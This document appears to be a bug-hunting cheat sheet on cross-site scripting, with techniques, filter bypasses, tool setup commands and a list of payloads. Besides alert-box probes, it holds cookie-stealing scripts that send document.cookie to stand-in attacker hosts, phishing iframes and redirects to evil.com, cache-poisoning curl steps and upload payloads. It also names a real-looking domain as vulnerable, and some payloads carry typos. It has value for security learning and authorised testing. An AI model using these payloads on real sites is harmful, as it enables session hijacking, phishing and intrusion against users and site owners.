# xss

What is XSS?:

When an attacker can trick the web application to insert an arbitrary Javascript code and execute it, the attack is known as Cross Site Scripting or XSS in short.



Types of XSS:

Reflected XSS: Input gets reflected on the page

Stored XSS: Input gets stored in the server

DOM XSS: Input gets stored in the DOM i.e goes from the source and gets out from the sink



How XSS works?

Attacker sends a link to the victim

Victim authenticates with the server

Attacker gets the cookie



Reflected XSS Method

Check for input if it gets reflected in Page Source, Body or URL

If input gets reflected we can hunt for RXSS

Send a simple alert box to execute and prove XSS

It happens due to no proper validation or sanitization of inputs



XSS Payloads:
A list of XSS Payloads can be downloaded from : https://github.com/payloadbox/xss-payload-list



Balancing:

Sometimes the payload gets injected in between certain tags and hence cannot get executed. Inorder for it to get executed we need to break the tag out.This is called as balancing.



Limited Input’s:

Sometimes <script> tags are blocked then we can use payloads such as <img src=x onerror=confirm(1)>



Sometimes alert(1) are also stripped out in such a case prompt and confirm can be used



XSS in User Agents:

Sometimes XSS can be performed via User-Agents.One such header is Referer. If the value gets reflected in the response, then RXSS can be performed.



XSS in Caching Server Attack:

In some web applications we attack using User Agents. Then we save our payload into Caching Server.Whenever anyone visits the url is cached and will lead to XSS.This will remain until cache is flushed.





XSS in Emails:

Some web applications have the email field vulnerable to XSS. We create the payload according to the RFC822 email address validator and prompt the famous alert box!

The email validator can be found : http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate



XSS Bypass Protection:

The following methods can bypass XSS Protection on a web server:

Encoding the Payload using encoding techniques like Base64

Sometimes web application block “(Double quotes) but a payload like ‘-alert(1)-’ can bypass the protection giving Reflected XSS

Blind XSS:

Sometimes in certain areas example in feedback forms or chat bots we do not have an idea if XSS exists or not, in such a case we will create a payload where the server will give us a response

This can be easily done by using XSSHunter where payloads as well as reports can be easily created

Link: https://xsshunter.com/



Stored XSS:

If a web application stores our payload then such an XSS is called a Stored XSS. Such fields can be found under “My Profile” Section.



DOM XSS

DOM XSS arises due to the fact that input comes from the source and gets executed in the sink.






DOM XSS Automated Scanner

Steps:

git clone https://github.com/dwisiswant0/findom-xss.git

git clone https://github.com/GerbenJavado/LinkFinder.git

cd LinkFinder

pip install -r requirements.txt

cd ..

cd findom-xss

nano findom-xss.sh

Change the path of linkfinder

Save and Quit

./findom-xss https://website.com



XSS Mouse Payloads:

Sometimes when keyboard payloads are blocked, we can perform XSS using mouse payloads as developers fail to protect them from being bypassed. Some of the mouse payloads are onmouseover, onmouseclick etc. A list can be found under resources.



XSS Polyglots:

Polyglots means someone who knows many languages. Combining it with XSS Payloads, it basically means a payload combination of 2 or more payloads in order to trick the web server and bypass many input checks.

A list of polyglot payloads can be found : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Intruders/XSS_Polyglots.txt



XSS to URL Redirection:

Using an injection point and crafting a specially based payload we can make the victim redirect to an evil website.

The Payload will look something like this: <script>document.href=”https://evilsite.com”</script>



XSS to Phishing:

Using an injection point and a specially crafted payload of iframe we can trick the user to see a login screen and make the user log in thus phishing the user.



Payload: <iframe src=”https://evilsite.com” height=”100%” width=”100%”></iframe>



XSS to Cookie Stealing:

This technique can increase the severity of XSS. A simple payload where the cookie of user will be redirected to the attacker’s web server.The payload can be as follows:



<script>document.location.href=”attackers.website/cookie=”>+document.cookie</script>



Where document.cookie will give the victims cookie and document.location.href will send the data to attacker’s web server



XSS via File Upload:

Some web servers do not check the content of the file while uploading them. In such a scenario an attacker can write the payload inside the file and upload the file on the web application thus leading to XSS.



Where web servers only upload image files, using an exiftool we can create a new parameter and add our payload in the value option and then upload the image file to web application thus prompting the alert box



XSS Mitigations:

Input Sanitization

Encode all input characters

Usage of WAF

Filter Input on Arrival

Encode data on output

Use appropriate response headers

Content Security Policy



ParamSpider:

A tool which can find hidden parameters on a website. The tool can be installed from https://github.com/devanshbatham/ParamSpider

Steps:

$ git clone https://github.com/devanshbatham/ParamSpider

$ cd ParamSpider

$ pip3 install -r requirements.txt

$ python3 paramspider.py --domain hackerone.com



https://github.com/devanshbatham/ParamSpider

Payloads: 

**Basic payload 
**<script>alert(1)</script>
<img src=x onerror=confirm(1)>
**Request header: 
**
1. Capture Request.
2.  Change request header to post 
3. Referer: https://google.com/? (check response for reflection)
4. https://google.com/?q=xss (check for balance and reflection of parameter xss)

**XSS on useragent  and chaching
**

1.curl "target.com/parameter.php?xss" -I 
2.Note : cahce:HIT (request coming from cache) cache:MISS (request not  coming for cache)
3.curl "target.com/parameter.php?xss" -I -H "xss:<svg onload=alert(1)>
4. Check if cahe got hit.
5. Change the endpoint curl "target.com/parameter.php?xss1" -I -H "xss:<svg onload=alert(1)>
6. run curl "target.com/parameter.php?xss1"      (check response for xss <svg header )
7. visit target.com/parameter.php?xss1 in browser !! BOOM XSS !!
                                                                              
**XSS on email login field                                                                               
**
Email address validator:
http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate
avanthi.edu.in = vulnerable
Payload = "><svg/onload=confirm(1)>"@x.y
                                                                              
                                                                                                                                                        
 **XSS using url encoding and base 64 encoding** = encode the payload 
 
**  Note : If script , img , " , encoding is blocked use :                                                                            
** '-confirm(xss)-'
                                                      
**Blind XSS 
**                                                                              
 Try on feedback or chat bot   
 
**Stored XSS
**
 
edit profile, chatbots, anything that'e getting stored. 
 
**XSS DOM  
**
 Source List : 
document.URL
document.referrer
location.href
location.hash
location.search
location.pathname 
 
 Sink list: 
 eval 
 setTimeout
 setInterval
 document.write
 elements.innerHTML
 
 payload for redirect parameter = javascript:alert(1)
 index=alert(1)
 
 DOM XSS SCANNER : https://github.com/dwisiswant0/findom-xss.git
  
  
** Onmouseover payload** : <a href="javascript:alert(1)" onmouseover=alert(1)>hovermeplz</a>

XSS exploitation:

URL redirection  payload: 
<script>doument.location.href="http://evil.com"</script>
<a href="http://evil.com">Login Here</a>

Phishing Payloads:

<iframe src="https://evil.com" height="100%" width="100%">

Cookie stealing:
<script>alert(document.cookie)</script>

<script>document.location.href="http://attacker.com/cookie"+document.cookie</script>      (we can also start a python -m SimpleHTTPServer 8080 )


XSS USING FILE UPLOADS :
Type 1 :
1. create a .svg file with the following content in the file :  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
2. Navigate to the file path, BOOM XXS .

Type 2:
1. Download a exif based image
2. Go to terminal and type : exiftool -Artist='"> <img src=x onerror=alert(1)>' filename(image_name)




 
 
